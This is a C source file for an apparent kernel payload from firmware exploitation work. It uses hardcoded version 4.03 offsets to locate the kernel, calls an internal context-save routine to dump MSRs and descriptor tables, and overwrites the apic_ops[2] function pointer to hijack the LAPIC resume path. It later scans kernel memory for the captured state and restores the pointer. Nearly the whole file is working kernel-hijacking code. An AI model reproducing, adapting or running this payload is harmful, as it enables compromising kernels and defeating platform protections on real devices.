#include <stdint.h>

/*
 * state_capture v4 — Call rdmsr_start (known address inside savectx)
 *
 * Previous versions failed:
 * v1/v2: savectx not in kdata; justreturn crashes on resume; no PCBs on fresh boot
 * v3: Probe range was 20KB from savectx. Even corrected range crashed because
 *     pcb_onfault only catches #PF, not #UD/#GP from mid-instruction entry.
 *     Also kproc threads may have td_pcb=0, making onfault inoperative.
 *     Also ktext is XOM (execute-only) — cannot read bytes to find prologue.
 *
 * v4 approach: Call rdmsr_start directly (ZERO probing)
 * - rdmsr_start (-0x9d0cfa) is a KNOWN address inside savectx
 * - It's the MSR save sequence: sets ECX before each rdmsr, writes to [RDI]
 * - Falls through to sgdt/sidt/sldt/str, then mov $1,%eax; ret
 * - Completely safe: all ECX values set by the code, all writes go to [RDI]
 * - Captures: FSBASE, GSBASE, KGSBASE, EFER, STAR, LSTAR, CSTAR, SFMASK,
 *             GDT, IDT, LDT, TR
 * - Does NOT capture: GPRs, CRs, DRs (those are before rdmsr_start in savectx)
 *
 * Mode (via fw_ver):
 *   0x4:   FIND    — call rdmsr_start, discover PCB layout for MSRs
 *   0x2:   ARM     — point apic_ops[2] at rdmsr_start
 *   0x3:   READBACK — scan kdata for MSR dump after resume
 *
 * Output layout (uint64_t indices):
 *
 * Mode 0x4 (FIND — 128 slots):
 *   [0]   magic | status
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   cpu_switch address
 *   [4]   rdmsr_start address (our callable entry point)
 *   [5]   call_result (should be 1)
 *   [6]   lstar_offset (PCB offset where LSTAR was written)
 *   [7]   verified_lstar (value at lstar_offset)
 *   [8]   actual_lstar
 *   [9]   actual_cr3
 *   [10]  cr3_at_0x68 (check if CR3 written — 0 expected since we skip CR saves)
 *   [11]  td_pcb (diagnostics)
 *   [12]  curthread
 *   --- Raw PCB dump from rdmsr_start call ---
 *   [20..51] 32 qwords of PCB (0x00-0xFF)
 *   [52..67] 16 qwords of PCB (0x100-0x17F)
 *   --- MSR field discovery ---
 *   [70]  offset of LSTAR in PCB
 *   [71]  offset of EFER in PCB (if found)
 *   [72]  offset of STAR in PCB (if found)
 *   [73]  number of non-zero qwords in PCB dump
 *   [127] end marker
 *
 * Mode 0x2 (ARM — 64 slots):
 *   [3]   rdmsr_start address (what we arm as apic_ops[2])
 *   [4]   original apic_ops[2]
 *   [5]   fingerprint_lstar
 *   [6]   fingerprint_cr3
 *   [7]   sentinel address
 *   [8]   sentinel value
 *   [9]   apic_ops[2] readback
 *   [10]  lstar_offset (saved for Mode 0x3)
 *   [63]  end marker
 *
 * Mode 0x3 (READBACK — 200 slots):
 *   [3]   sentinel readback
 *   [4]   sentinel survived?
 *   [5]   current apic_ops[2]
 *   [6]   fingerprint_lstar
 *   [7]   fingerprint_cr3
 *   [8]   pcb_found count
 *   [9]   best PCB base address
 *   [10]  lstar_offset used
 *   [11]  KASLR changed?
 *   [20..83]  raw PCB (64 qwords)
 *   [90-99]   interpreted fields
 *   [100] restored apic_ops[2]
 *   [199] end marker
 */

#define MAGIC_SCAP       0x53434150
#define MSR_LSTAR        0xC0000082
#define MSR_EFER         0xC0000080
#define MSR_STAR         0xC0000081
#define LSTAR_OFFSET     0x294218

/* FW 4.03 offsets */
#define APIC_OPS_OFF_KTEXT   0x1934AC8
#define CPU_SWITCH_OFF       (-0x9d6f80)
#define RDMSR_START_OFF      (-0x9d0cfa)  /* MSR save sequence inside savectx */

/* kdata regions */
#define SENTINEL_OFF     0x100
#define FINGERPRINT_OFF  0x200
#define PCB_BUF_OFF      0x400

#define SENTINEL_VAL     0x5356435854455354ULL

/* Known PCB field offsets (assembly constants, stable across versions) */
#define PCB_R15          0x00
#define PCB_R14          0x08
#define PCB_R13          0x10
#define PCB_R12          0x18
#define PCB_RBP          0x20
#define PCB_RSP          0x28
#define PCB_RBX          0x30
#define PCB_RIP          0x38
#define PCB_CR0          0x58
#define PCB_CR3          0x68

#define PCB_SCAN_SIZE    0x200
#define TD_PCB           0x3f8

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read_cr3(void)
{
    uint64_t val;
    __asm__ volatile("movq %%cr3, %0" : "=r"(val));
    return val;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

/*
 * Call a known-safe ktext function with RDI = arg.
 * No pcb_onfault — the caller must be certain the address is valid.
 * Protects callee-saved regs (savectx reads them to store in PCB).
 */
static uint64_t call_known_func(uint64_t func_addr, uint64_t rdi_arg)
{
    uint64_t result;
    __asm__ volatile(
        "pushq %%rbx\n\t"
        "pushq %%rbp\n\t"
        "pushq %%r12\n\t"
        "pushq %%r13\n\t"
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"

        "movq %[rdi_arg], %%rdi\n\t"
        "callq *%[func]\n\t"
        "movq %%rax, %[result]\n\t"

        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "popq %%r13\n\t"
        "popq %%r12\n\t"
        "popq %%rbp\n\t"
        "popq %%rbx\n\t"

        : [result] "=&r"(result)
        : [func] "r"(func_addr), [rdi_arg] "r"(rdi_arg)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11",
          "memory", "cc"
    );
    return result;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;
    uint64_t cr3 = read_cr3();

    if (mode == 0x4) {
        /* ============================================================
         * MODE 0x4: FIND — Call rdmsr_start directly, map PCB layout
         *
         * rdmsr_start is a KNOWN address inside savectx (MSR save
         * sequence). It sets ECX before each rdmsr, writes MSR values
         * to [RDI+offsets], saves descriptor tables, returns 1.
         *
         * We call it with RDI = pcb_buf to discover which PCB offsets
         * get MSR values (especially LSTAR for fingerprinting).
         * ============================================================ */
        for (int i = 0; i < 128; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;

        uint64_t cpu_switch = kdata_base + (int64_t)CPU_SWITCH_OFF;
        out[3] = cpu_switch;

        uint64_t rdmsr_start_addr = kdata_base + (int64_t)RDMSR_START_OFF;
        out[4] = rdmsr_start_addr;

        out[8] = lstar;
        out[9] = cr3;

        /* Diagnostics */
        uint64_t curthread;
        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
        uint64_t td_pcb = read8(curthread + TD_PCB);
        out[11] = td_pcb;
        out[12] = curthread;

        /* PCB buffer in kdata for rdmsr_start to write into */
        uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;

        /* Clear buffer */
        for (int i = 0; i < PCB_SCAN_SIZE / 8; i++)
            write8(pcb_buf + i * 8, 0);

        /* Call rdmsr_start — KNOWN SAFE, no probing */
        uint64_t ret = call_known_func(rdmsr_start_addr, pcb_buf);
        out[5] = ret;

        /* Check if CR3 was written (it shouldn't be — CR saves are
         * before rdmsr_start in savectx) */
        out[10] = read8(pcb_buf + PCB_CR3);

        /* Dump raw PCB: 48 qwords (0x180 bytes) */
        for (int i = 0; i < 32; i++)
            out[20 + i] = read8(pcb_buf + i * 8);
        for (int i = 0; i < 16; i++)
            out[52 + i] = read8(pcb_buf + 0x100 + i * 8);

        /* Find LSTAR offset in PCB */
        uint64_t lstar_off = 0;
        for (uint64_t off = 0; off < PCB_SCAN_SIZE; off += 8) {
            if (read8(pcb_buf + off) == lstar) {
                lstar_off = off;
                break;
            }
        }
        out[6] = lstar_off;
        out[7] = lstar_off ? read8(pcb_buf + lstar_off) : 0;
        out[70] = lstar_off;

        /* Find EFER offset */
        uint64_t efer = rdmsr(MSR_EFER);
        uint64_t efer_off = 0;
        for (uint64_t off = 0; off < PCB_SCAN_SIZE; off += 8) {
            if (read8(pcb_buf + off) == efer && off != lstar_off) {
                efer_off = off;
                break;
            }
        }
        out[71] = efer_off;

        /* Find STAR offset */
        uint64_t star = rdmsr(MSR_STAR);
        uint64_t star_off = 0;
        for (uint64_t off = 0; off < PCB_SCAN_SIZE; off += 8) {
            if (read8(pcb_buf + off) == star && off != lstar_off && off != efer_off) {
                star_off = off;
                break;
            }
        }
        out[72] = star_off;

        /* Count non-zero qwords (diagnostic) */
        uint32_t nz = 0;
        for (uint64_t off = 0; off < PCB_SCAN_SIZE; off += 8) {
            if (read8(pcb_buf + off) != 0)
                nz++;
        }
        out[73] = nz;

        /* Save rdmsr_start and lstar_offset to kdata for Mode 0x2/0x3 */
        write8(kdata_base + FINGERPRINT_OFF + 0x18, lstar_off);
        write8(kdata_base + FINGERPRINT_OFF + 0x20, rdmsr_start_addr);

        out32[0] = MAGIC_SCAP;
        out32[1] = (ret == 1) ? 0x0004 : 0x00FD;
        out[127] = 0xdeadbeefcafe0040ULL;
        return 0;
    }

    if (mode == 0x2) {
        /* ============================================================
         * MODE 0x2: ARM — Point apic_ops[2] at rdmsr_start
         *
         * rdmsr_start returns 1 (matching xapic_mode's expected return).
         * During LAPIC resume, RDI will contain whatever the caller
         * left there. rdmsr_start will write MSR state to [RDI].
         * ============================================================ */
        for (int i = 0; i < 64; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;

        /* Use rdmsr_start directly — no need to find savectx */
        uint64_t target_addr = kdata_base + (int64_t)RDMSR_START_OFF;
        uint64_t lstar_off = read8(kdata_base + FINGERPRINT_OFF + 0x18);

        out[3] = target_addr;

        uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
        volatile uint64_t *apic_table = (volatile uint64_t *)apic_ops_addr;
        uint64_t original_xapic = apic_table[2];
        out[4] = original_xapic;

        /* Save fingerprints */
        uint64_t fp_addr = kdata_base + FINGERPRINT_OFF;
        write8(fp_addr + 0x00, lstar);
        write8(fp_addr + 0x08, cr3);
        write8(fp_addr + 0x10, original_xapic);

        out[5] = lstar;
        out[6] = cr3;
        out[10] = lstar_off;

        /* Write sentinel */
        write8(kdata_base + SENTINEL_OFF, SENTINEL_VAL);
        out[7] = kdata_base + SENTINEL_OFF;
        out[8] = SENTINEL_VAL;

        /* ARM: overwrite apic_ops[2] with rdmsr_start */
        apic_table[2] = target_addr;
        out[9] = apic_table[2];

        if (apic_table[2] != target_addr) {
            apic_table[2] = original_xapic;
            out32[0] = MAGIC_SCAP;
            out32[1] = 0x00FE;
            out[63] = 0xdeadbeefcafe0020ULL;
            return 0;
        }

        out32[0] = MAGIC_SCAP;
        out32[1] = 0x0002;
        out[63] = 0xdeadbeefcafe0020ULL;
        return 0;
    }

    if (mode == 0x3) {
        /* ============================================================
         * MODE 0x3: READBACK — Find rdmsr_start's MSR dump after resume
         *
         * During resume, rdmsr_start (as apic_ops[2]) was called with
         * whatever RDI the LAPIC code had. It wrote MSR values + desc
         * tables to [RDI]. We scan kdata for LSTAR to find the dump.
         * ============================================================ */
        for (int i = 0; i < 200; i++) out[i] = 0;

        out[1] = kdata_base;
        out[2] = ktext_base;

        /* Check sentinel */
        uint64_t sentinel = read8(kdata_base + SENTINEL_OFF);
        out[3] = sentinel;
        out[4] = (sentinel == SENTINEL_VAL) ? 1 : 0;

        /* Read current apic_ops[2] */
        uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
        volatile uint64_t *apic_table = (volatile uint64_t *)apic_ops_addr;
        out[5] = apic_table[2];

        /* Read fingerprints */
        uint64_t fp_addr = kdata_base + FINGERPRINT_OFF;
        uint64_t fp_lstar = read8(fp_addr + 0x00);
        uint64_t fp_cr3 = read8(fp_addr + 0x08);
        uint64_t fp_orig_xapic = read8(fp_addr + 0x10);
        uint64_t saved_lstar_off = read8(fp_addr + 0x18);

        out[6] = fp_lstar;
        out[7] = fp_cr3;
        out[10] = saved_lstar_off;
        out[11] = (fp_lstar != lstar) ? 1 : 0;

        uint64_t match_lstar = fp_lstar ? fp_lstar : lstar;

        /* If we don't have lstar_offset, discover it now by calling
         * rdmsr_start (known safe) */
        if (!saved_lstar_off) {
            uint64_t rdmsr_start_addr = kdata_base + (int64_t)RDMSR_START_OFF;
            uint64_t pcb_buf = kdata_base + PCB_BUF_OFF;
            for (int i = 0; i < PCB_SCAN_SIZE / 8; i++)
                write8(pcb_buf + i * 8, 0);
            uint64_t ret = call_known_func(rdmsr_start_addr, pcb_buf);
            if (ret == 1) {
                for (uint64_t off = 0; off < PCB_SCAN_SIZE; off += 8) {
                    if (read8(pcb_buf + off) == lstar) {
                        saved_lstar_off = off;
                        out[10] = off;
                        break;
                    }
                }
            }
        }

        /* Scan kdata for LSTAR value to find MSR dumps.
         * rdmsr_start writes LSTAR at a known PCB offset.
         * We search for that LSTAR value anywhere in kdata. */
        uint32_t pcb_found = 0;
        uint64_t best_pcb = 0;

        if (saved_lstar_off) {
            /* Precise scan: look for LSTAR at the known offset */
            for (uint64_t addr = kdata_base;
                 addr < kdata_base + 0x7000000;
                 addr += 8) {
                if (read8(addr) != match_lstar)
                    continue;

                /* Check if this could be a PCB by examining nearby fields.
                 * Since we only have MSR fields (no CR0/CR3 from rdmsr_start),
                 * check for EFER nearby. */
                uint64_t pcb_base = addr - saved_lstar_off;
                if (pcb_base < kdata_base || pcb_base + PCB_SCAN_SIZE >= kdata_base + 0x7000000)
                    continue;

                pcb_found++;
                if (!best_pcb)
                    best_pcb = pcb_base;
            }
        } else {
            /* No lstar_offset — scan for raw LSTAR value */
            for (uint64_t addr = kdata_base;
                 addr < kdata_base + 0x7000000;
                 addr += 8) {
                if (read8(addr) == match_lstar) {
                    pcb_found++;
                    if (!best_pcb)
                        best_pcb = addr;
                }
            }
        }

        out[8] = pcb_found;
        out[9] = best_pcb;

        if (best_pcb) {
            /* Dump raw PCB: 64 qwords */
            uint64_t dump_base = saved_lstar_off ? best_pcb : (best_pcb - 0x80);
            if (dump_base < kdata_base)
                dump_base = kdata_base;

            for (int i = 0; i < 64 && (20 + i) < 84; i++)
                out[20 + i] = read8(dump_base + i * 8);

            if (saved_lstar_off) {
                out[90] = read8(best_pcb + PCB_RIP);
                out[91] = read8(best_pcb + PCB_RSP);
                out[92] = read8(best_pcb + PCB_RBP);
                out[93] = read8(best_pcb + PCB_CR0);
                out[94] = read8(best_pcb + PCB_CR3);
                out[95] = read8(best_pcb + saved_lstar_off);
                if (saved_lstar_off >= 0x10) {
                    out[96] = read8(best_pcb + saved_lstar_off - 0x10);
                    out[97] = read8(best_pcb + saved_lstar_off - 0x08);
                }
                out[98] = read8(best_pcb + saved_lstar_off + 0x08);
                out[99] = read8(best_pcb + saved_lstar_off + 0x10);
            }
        }

        /* Restore apic_ops[2] */
        if (fp_orig_xapic) {
            apic_table[2] = fp_orig_xapic;
            out[100] = apic_table[2];
        }

        out32[0] = MAGIC_SCAP;
        out32[1] = best_pcb ? 0x1003 : 0x0003;
        out[199] = 0xdeadbeefcafe0030ULL;
        return 0;
    }

    /* Unknown mode */
    for (int i = 0; i < 64; i++) out[i] = 0;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out32[0] = MAGIC_SCAP;
    out32[1] = 0x00FF;
    out[63] = 0xdeadbeefcafe00FFULL;
    return 0;
}
